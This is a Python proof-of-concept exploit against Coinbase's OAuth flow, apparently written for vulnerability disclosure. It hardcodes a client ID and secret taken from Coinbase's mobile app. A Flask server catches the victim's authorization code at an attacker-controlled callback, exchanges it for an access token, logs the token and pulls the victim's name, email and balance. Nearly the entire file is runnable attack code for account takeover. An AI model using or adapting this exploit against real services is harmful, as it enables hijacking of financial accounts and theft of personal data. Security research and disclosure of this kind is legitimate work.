#!/usr/bin/python
# -*- coding: utf-8 -*-

# Coinbase.com OAuth Authorization PoC
# Donncha O'Cearbhaill - 4/05/13
# donncha@donncha.is - PGP: 0xAEC10762

import requests
import json
from BeautifulSoup import BeautifulSoup
from flask import Flask, request, render_template

# Credentials for Coinbase mobile application - https://github.com/coinbase/coinbase-android/blob/master/coinbase-android/src/com/coinbase/api/LoginManager.java#L46-48
CLIENT_ID = '34183b03a3e1f0b74ee6aa8a6150e90125de2d6c1ee4ff7880c2b7e6e98b11f5'
CLIENT_SECRET = '2c481f46f9dc046b4b9a67e630041b9906c023d139fbc77a47053328b9d3122d'
CALLBACK_URL = 'http://example.com/coinbase-redirect'
OAUTH_URL = 'https://coinbase.com/oauth/authorize?response_type=code&client_id=' + CLIENT_ID + '&redirect_uri=' + CALLBACK_URL


def getAccessToken(code_token):
    access_token_data = {
        'grant_type': 'authorization_code',
        'code': code_token,
        'redirect_uri': CALLBACK_URL,
        'client_id': CLIENT_ID,
        'client_secret': CLIENT_SECRET,
        }
    r = requests.post('https://coinbase.com/oauth/token', data=access_token_data)
    print r.text
    if r.status_code == 200:  # Request was successful, output access token and return it.
        #token_data = json.loads(r.text)
        return str(json.loads(r.text)['access_token'])
    else:
        print 'There was an error retrieving the access_token'
        print r.text


# Setup Flask Webserver
app = Flask(__name__, template_folder="templates-mobile")

@app.route('/')
#@basic_auth.required
def index():
    # Index page cotaining explaination and redirecting the user to app approval
    return render_template('index.html')


# Retrieve the code token from the insecure callback, get the access token and make some tests.
@app.route('/coinbase-redirect')
#@basic_auth.required
def callbackPage():
    code_token = str(request.args.get('code', ''))
    print 'Callback Code: ' + code_token  # Log code to stdout
    access_token = str(getAccessToken(code_token))
    if len(access_token) == 64:  # Check we got an access token in the expected format
        print 'Access Token: ' + access_token  # Log access_token to stdout

        # Retrieve some victim information to confirm the compromise.
        user_json = requests.get('https://coinbase.com/api/v1/users?access_token=' + access_token)

        # Create output data
        user = json.loads(user_json.content)['users'][0]['user']
        results = [
        		('ID', user['id']),
        		('Name', user['name']),
        		('Email',	user['email']),
        		('Currency', user['native_currency']),
        		('Balance', user['balance']['amount']+' '+user['balance']['currency']),
        ]

        print results
        return render_template('result.html', code_token=code_token, access_token=access_token, results=results)  # + balance_data.text
    else:
        return 'Error: Could not retrieve access token'

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=80, debug=True)
